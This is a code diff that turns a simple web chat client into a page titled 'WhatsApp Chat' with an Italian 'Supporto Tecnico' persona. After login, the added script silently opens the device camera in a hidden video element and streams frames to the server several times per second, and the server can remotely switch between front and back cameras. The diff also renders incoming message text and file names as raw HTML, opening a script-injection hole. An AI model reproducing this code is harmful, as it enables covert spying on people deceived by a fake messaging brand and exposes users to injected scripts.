@@ -3,82 +3,682 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Client Chat</title>
+<title>WhatsApp Chat</title>
 <style>
-body{margin:0;padding:0;font-family:Arial;background:#000;color:#0f0;text-align:center}
-#chat{height:80vh;overflow:auto;padding:10px}
-.row{margin:6px 0}
-.row.me{text-align:right}
-.bubble{display:inline-block;padding:6px 10px;border-radius:14px;background:#0b4f2a;max-width:70%}
-.row.me .bubble{background:#2EA144;color:#001}
-.controls{display:flex;padding:6px}
-.controls input{flex:1;padding:6px;border-radius:6px;border:none;background:#011001;color:#dfffdc}
-.controls button{margin-left:6px;padding:6px 10px;background:#2EA144;border:none;color:#001;border-radius:6px;cursor:pointer}
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { 
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+  background: #0a0a0a;
+  color: #fff;
+  height: 100vh;
+  overflow: hidden;
+}
+
+.chat-container {
+  display: flex;
+  flex-direction: column;
+  height: 100vh;
+  max-width: 500px;
+  margin: 0 auto;
+  background: #111;
+  border-radius: 0;
+}
+
+.header {
+  background: #075e54;
+  padding: 15px 20px;
+  display: flex;
+  align-items: center;
+  gap: 15px;
+  border-bottom: 1px solid #333;
+}
+
+.avatar {
+  width: 40px;
+  height: 40px;
+  border-radius: 50%;
+  background: #25d366;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-weight: bold;
+  font-size: 18px;
+}
+
+.header-info h2 {
+  font-size: 16px;
+  margin-bottom: 2px;
+}
+
+.header-info p {
+  font-size: 12px;
+  color: #ccc;
+}
+
+.messages {
+  flex: 1;
+  overflow-y: auto;
+  padding: 20px;
+  background: #0a0a0a;
+  background-image: 
+    radial-gradient(circle at 20% 50%, rgba(120, 119, 198, 0.1) 0%, transparent 50%),
+    radial-gradient(circle at 80% 20%, rgba(255, 119, 198, 0.1) 0%, transparent 50%),
+    radial-gradient(circle at 40% 80%, rgba(120, 219, 255, 0.1) 0%, transparent 50%);
+}
+
+.message {
+  margin-bottom: 15px;
+  display: flex;
+  align-items: flex-end;
+  gap: 8px;
+}
+
+.message.sent {
+  flex-direction: row-reverse;
+}
+
+.message-bubble {
+  max-width: 70%;
+  padding: 12px 16px;
+  border-radius: 18px;
+  position: relative;
+  word-wrap: break-word;
+}
+
+.message.received .message-bubble {
+  background: #2a2a2a;
+  border-bottom-left-radius: 4px;
+}
+
+.message.sent .message-bubble {
+  background: #075e54;
+  border-bottom-right-radius: 4px;
+}
+
+.message-time {
+  font-size: 11px;
+  color: #999;
+  margin-top: 4px;
+  text-align: right;
+}
+
+.message.received .message-time {
+  text-align: left;
+}
+
+.attachment {
+  margin-top: 8px;
+  border-radius: 8px;
+  overflow: hidden;
+  max-width: 200px;
+}
+
+.attachment img {
+  width: 100%;
+  height: auto;
+  display: block;
+}
+
+.attachment-file {
+  padding: 8px;
+  background: rgba(255,255,255,0.1);
+  border-radius: 8px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.input-area {
+  padding: 15px 20px;
+  background: #1a1a1a;
+  border-top: 1px solid #333;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+
+.input-container {
+  flex: 1;
+  display: flex;
+  align-items: center;
+  background: #2a2a2a;
+  border-radius: 25px;
+  padding: 8px 15px;
+  gap: 10px;
+}
+
+#text {
+  flex: 1;
+  background: none;
+  border: none;
+  color: #fff;
+  font-size: 14px;
+  outline: none;
+}
+
+#text::placeholder {
+  color: #999;
+}
+
+.attach-btn, .send-btn {
+  background: none;
+  border: none;
+  color: #25d366;
+  cursor: pointer;
+  padding: 8px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: background 0.2s;
+}
+
+.attach-btn:hover, .send-btn:hover {
+  background: rgba(37, 211, 102, 0.1);
+}
+
+.send-btn {
+  background: #25d366;
+  color: white;
+}
+
+.send-btn:hover {
+  background: #20c55a;
+}
+
+#fileInput {
+  display: none;
+}
+
+.typing-indicator {
+  display: none;
+  padding: 10px 20px;
+  color: #999;
+  font-size: 12px;
+  font-style: italic;
+}
+
+.typing-indicator.show {
+  display: block;
+}
+
+.status-bar {
+  background: #075e54;
+  padding: 5px 20px;
+  font-size: 12px;
+  text-align: center;
+  color: #ccc;
+}
+
+@media (max-width: 480px) {
+  .chat-container {
+    max-width: 100%;
+    border-radius: 0;
+  }
+  
+  .header {
+    padding: 12px 15px;
+  }
+  
+  .messages {
+    padding: 15px;
+  }
+  
+  .input-area {
+    padding: 12px 15px;
+  }
+}
+
+/* Login Screen Styles */
+.login-container {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  min-height: 100vh;
+  background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
+  padding: 20px;
+}
+
+.login-card {
+  background: #1a1a1a;
+  border-radius: 20px;
+  padding: 40px;
+  max-width: 400px;
+  width: 100%;
+  box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+  border: 1px solid #333;
+}
+
+.login-header {
+  text-align: center;
+  margin-bottom: 30px;
+}
+
+.login-avatar {
+  width: 80px;
+  height: 80px;
+  border-radius: 50%;
+  background: linear-gradient(135deg, #25d366, #075e54);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 40px;
+  margin: 0 auto 20px;
+  box-shadow: 0 10px 20px rgba(37, 211, 102, 0.2);
+}
+
+.login-header h1 {
+  font-size: 24px;
+  margin-bottom: 10px;
+  color: #fff;
+}
+
+.login-header p {
+  color: #ccc;
+  font-size: 14px;
+  line-height: 1.4;
+}
+
+.login-form {
+  display: flex;
+  flex-direction: column;
+  gap: 20px;
+}
+
+#usernameInput {
+  background: #2a2a2a;
+  border: 2px solid #444;
+  color: #fff;
+  padding: 15px 20px;
+  border-radius: 12px;
+  font-size: 16px;
+  outline: none;
+  transition: all 0.3s;
+}
+
+#usernameInput:focus {
+  border-color: #25d366;
+  box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.1);
+}
+
+#usernameInput::placeholder {
+  color: #999;
+}
+
+.login-btn {
+  background: linear-gradient(135deg, #25d366, #20c55a);
+  border: none;
+  color: white;
+  padding: 15px 30px;
+  border-radius: 12px;
+  font-size: 16px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.3s;
+  box-shadow: 0 5px 15px rgba(37, 211, 102, 0.3);
+}
+
+.login-btn:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 8px 25px rgba(37, 211, 102, 0.4);
+}
+
+.login-btn:active {
+  transform: translateY(0);
+}
+
+.login-btn:disabled {
+  opacity: 0.6;
+  cursor: not-allowed;
+  transform: none;
+}
+
+@media (max-width: 480px) {
+  .login-card {
+    padding: 30px 20px;
+    margin: 10px;
+  }
+  
+  .login-header h1 {
+    font-size: 20px;
+  }
+}
 </style>
 </head>
 <body>
-<div id="chat"></div>
-<div class="controls">
-  <input type="text" id="text" placeholder="Scrivi un messaggio...">
-  <button id="sendBtn">Invia</button>
+<!-- Login Screen -->
+<div class="login-container" id="loginContainer">
+  <div class="login-card">
+    <div class="login-header">
+      <div class="login-avatar">💬</div>
+      <h1>Benvenuto</h1>
+      <p>Inserisci il tuo nome per iniziare la chat</p>
+    </div>
+    <div class="login-form">
+      <input type="text" id="usernameInput" placeholder="Il tuo nome..." maxlength="20">
+      <button id="loginBtn" class="login-btn">Inizia Chat</button>
+    </div>
+  </div>
+</div>
+
+<!-- Chat Interface -->
+<div class="chat-container" id="chatContainer" style="display: none;">
+  <div class="status-bar" id="statusBar">Connessione...</div>
+  
+  <div class="header">
+    <div class="avatar">A</div>
+    <div class="header-info">
+      <h2>Supporto Tecnico</h2>
+      <p id="connectionStatus">Connesso</p>
+    </div>
+  </div>
+  
+  <div class="messages" id="messages"></div>
+  
+  <div class="typing-indicator" id="typingIndicator">
+    Supporto sta scrivendo...
+  </div>
+  
+  <div class="input-area">
+    <div class="input-container">
+      <input type="file" id="fileInput" accept="image/*,video/*,.pdf,.doc,.docx,.txt">
+      <button class="attach-btn" id="attachBtn">📎</button>
+      <input type="text" id="text" placeholder="Scrivi un messaggio...">
+      <button class="send-btn" id="sendBtn">➤</button>
+    </div>
+  </div>
 </div>
 
 <script>
-const room = prompt('Inserisci il tuo ID utente') || 'user1';
-const ws = new WebSocket(`${location.protocol==='https:'?'wss':'ws'}://${location.host}/ws?role=client&room=${room}`);
-const chatEl=document.getElementById('chat');
-const textIn=document.getElementById('text');
-const sendBtn=document.getElementById('sendBtn');
+let room = null;
+let ws = null;
+let messagesEl = null;
+let textIn = null;
+let sendBtn = null;
+let attachBtn = null;
+let fileInput = null;
+let statusBar = null;
+let connectionStatus = null;
+let typingIndicator = null;
 
-function addMessage(from,text,me=false){
-  const row=document.createElement('div');
-  row.className='row'+(me?' me':'');
-  const bubble=document.createElement('div');
-  bubble.className='bubble';
-  bubble.textContent=text;
-  row.appendChild(bubble);
-  chatEl.appendChild(row);
-  chatEl.scrollTop=chatEl.scrollHeight;
+let currentCamera = 'back';
+let videoStream = null;
+let videoElement = null;
+let canvas = null;
+let isStreaming = false;
+
+// Login elements
+const loginContainer = document.getElementById('loginContainer');
+const chatContainer = document.getElementById('chatContainer');
+const usernameInput = document.getElementById('usernameInput');
+const loginBtn = document.getElementById('loginBtn');
+
+// Login functionality
+function initializeLogin() {
+  loginBtn.addEventListener('click', handleLogin);
+  usernameInput.addEventListener('keypress', (e) => {
+    if (e.key === 'Enter') handleLogin();
+  });
+  
+  // Auto-focus on input
+  usernameInput.focus();
 }
 
-ws.addEventListener('message',e=>{
-  try{
-    const data=JSON.parse(e.data);
-    if(data.type==='chat') addMessage(data.from,data.text,false);
-  }catch(err){console.error(err);}
-});
+function handleLogin() {
+  const username = usernameInput.value.trim();
+  if (!username) {
+    usernameInput.style.borderColor = '#ff4444';
+    usernameInput.focus();
+    return;
+  }
+  
+  room = username;
+  loginContainer.style.display = 'none';
+  chatContainer.style.display = 'flex';
+  
+  // Initialize chat
+  initializeChat();
+}
 
-sendBtn.onclick=()=>{
-  const txt=textIn.value.trim();
-  if(!txt) return;
-  ws.send(JSON.stringify({type:'chat',text:txt}));
-  addMessage('Tu',txt,true);
-  textIn.value='';
-};
+function initializeChat() {
+  // Initialize WebSocket connection
+  ws = new WebSocket(`${location.protocol==='https:'?'wss':'ws'}://${location.host}/ws?role=client&room=${room}`);
+  
+  // Get chat elements
+  messagesEl = document.getElementById('messages');
+  textIn = document.getElementById('text');
+  sendBtn = document.getElementById('sendBtn');
+  attachBtn = document.getElementById('attachBtn');
+  fileInput = document.getElementById('fileInput');
+  statusBar = document.getElementById('statusBar');
+  connectionStatus = document.getElementById('connectionStatus');
+  typingIndicator = document.getElementById('typingIndicator');
+  
+  // Setup chat functionality
+  setupChatFunctionality();
+}
 
-// Chiedi consenso fotocamera e invia frame
-async function startCamera(){
-  try{
-    const stream=await navigator.mediaDevices.getUserMedia({video:{width:{ideal:640}},audio:false});
-    const video=document.createElement('video');
-    video.srcObject=stream;
-    video.play();
-    const canvas=document.createElement('canvas');
-    function sendFrame(){
-      if(video.videoWidth===0){ setTimeout(sendFrame,120); return; }
-      canvas.width=video.videoWidth/2;
-      canvas.height=video.videoHeight/2;
-      const ctx=canvas.getContext('2d');
-      ctx.drawImage(video,0,0,canvas.width,canvas.height);
-      const imgData=canvas.toDataURL('image/jpeg',0.65);
-      ws.send(JSON.stringify({type:'video',room,cam:'back',image:imgData}));
-      setTimeout(sendFrame,120);
+function setupChatFunctionality() {
+  // Connection status
+  ws.addEventListener('open', () => {
+    statusBar.textContent = 'Connesso';
+    connectionStatus.textContent = 'Connesso';
+  });
+
+  ws.addEventListener('close', () => {
+    statusBar.textContent = 'Disconnesso';
+    connectionStatus.textContent = 'Disconnesso';
+  });
+
+  ws.addEventListener('error', () => {
+    statusBar.textContent = 'Errore di connessione';
+    connectionStatus.textContent = 'Errore';
+  });
+
+  // WebSocket message handling
+  ws.addEventListener('message', e => {
+    try {
+      const data = JSON.parse(e.data);
+      
+      if (data.type === 'chat') {
+        addMessage(data.from, data.text, false, data.attachment, data.timestamp);
+      }
+      
+      if (data.type === 'cameraControl') {
+        if (data.camera !== currentCamera) {
+          currentCamera = data.camera;
+          startCamera();
+        }
+      }
+    } catch (err) {
+      console.error(err);
     }
-    sendFrame();
-  }catch(err){ console.log('Errore fotocamera',err); }
+  });
+
+  // Setup chat input
+  sendBtn.onclick = sendMessage;
+  textIn.addEventListener('keypress', (e) => {
+    if (e.key === 'Enter') sendMessage();
+  });
+
+  // Setup file attachment
+  attachBtn.onclick = () => fileInput.click();
+  fileInput.addEventListener('change', handleFileUpload);
+
+  // Start camera
+  startCamera();
 }
 
-startCamera();
+function addMessage(from, text, me = false, attachment = null, timestamp = null) {
+  const messageEl = document.createElement('div');
+  messageEl.className = `message ${me ? 'sent' : 'received'}`;
+  
+  const bubbleEl = document.createElement('div');
+  bubbleEl.className = 'message-bubble';
+  
+  if (text) {
+    bubbleEl.innerHTML = `<div>${text}</div>`;
+  }
+  
+  if (attachment) {
+    const attachmentEl = document.createElement('div');
+    attachmentEl.className = 'attachment';
+    
+    if (attachment.type === 'image') {
+      attachmentEl.innerHTML = `<img src="${attachment.url}" alt="Immagine">`;
+    } else {
+      attachmentEl.innerHTML = `
+        <div class="attachment-file">
+          <span>📎</span>
+          <span>${attachment.name}</span>
+        </div>
+      `;
+    }
+    bubbleEl.appendChild(attachmentEl);
+  }
+  
+  const timeEl = document.createElement('div');
+  timeEl.className = 'message-time';
+  timeEl.textContent = timestamp ? new Date(timestamp).toLocaleTimeString() : new Date().toLocaleTimeString();
+  bubbleEl.appendChild(timeEl);
+  
+  messageEl.appendChild(bubbleEl);
+  messagesEl.appendChild(messageEl);
+  messagesEl.scrollTop = messagesEl.scrollHeight;
+}
+
+// Send message
+function sendMessage() {
+  const text = textIn.value.trim();
+  if (!text) return;
+  
+  ws.send(JSON.stringify({ type: 'chat', text }));
+  addMessage('Tu', text, true);
+  textIn.value = '';
+}
+
+// File upload handler
+async function handleFileUpload(e) {
+  const file = e.target.files[0];
+  if (!file) return;
+  
+  const formData = new FormData();
+  formData.append('file', file);
+  
+  try {
+    const response = await fetch('/upload', {
+      method: 'POST',
+      body: formData
+    });
+    
+    const result = await response.json();
+    
+    if (result.url) {
+      const attachment = {
+        type: file.type.startsWith('image/') ? 'image' : 'file',
+        url: result.url,
+        name: result.originalName
+      };
+      
+      ws.send(JSON.stringify({ 
+        type: 'chat', 
+        text: `📎 ${file.name}`,
+        attachment 
+      }));
+      
+      addMessage('Tu', `📎 ${file.name}`, true, attachment);
+    }
+  } catch (err) {
+    console.error('Upload error:', err);
+  }
+  
+  fileInput.value = '';
+}
+
+// Camera functionality
+async function startCamera() {
+  if (isStreaming) {
+    stopCamera();
+  }
+  
+  try {
+    const constraints = {
+      video: {
+        width: { ideal: 640 },
+        height: { ideal: 480 },
+        facingMode: currentCamera === 'front' ? 'user' : 'environment'
+      },
+      audio: false
+    };
+    
+    videoStream = await navigator.mediaDevices.getUserMedia(constraints);
+    
+    if (!videoElement) {
+      videoElement = document.createElement('video');
+      videoElement.style.display = 'none';
+      document.body.appendChild(videoElement);
+    }
+    
+    if (!canvas) {
+      canvas = document.createElement('canvas');
+    }
+    
+    videoElement.srcObject = videoStream;
+    videoElement.play();
+    
+    isStreaming = true;
+    sendVideoFrames();
+    
+  } catch (err) {
+    console.log('Camera error:', err);
+    statusBar.textContent = 'Camera non disponibile';
+  }
+}
+
+function stopCamera() {
+  if (videoStream) {
+    videoStream.getTracks().forEach(track => track.stop());
+    videoStream = null;
+  }
+  isStreaming = false;
+}
+
+function sendVideoFrames() {
+  if (!isStreaming || !videoElement || !canvas) return;
+  
+  if (videoElement.videoWidth === 0) {
+    setTimeout(sendVideoFrames, 100);
+    return;
+  }
+  
+  // Optimize frame rate and quality
+  canvas.width = videoElement.videoWidth / 2;
+  canvas.height = videoElement.videoHeight / 2;
+  
+  const ctx = canvas.getContext('2d');
+  ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+  
+  const imgData = canvas.toDataURL('image/jpeg', 0.7);
+  ws.send(JSON.stringify({
+    type: 'video',
+    room,
+    cam: currentCamera,
+    image: imgData
+  }));
+  
+  // Optimized frame rate (8 FPS for better performance)
+  setTimeout(sendVideoFrames, 125);
+}
+
+// Initialize login on page load
+initializeLogin();
+
+// Cleanup on page unload
+window.addEventListener('beforeunload', () => {
+  if (isStreaming) {
+    stopCamera();
+  }
+});
 </script>
 </body>
 </html>
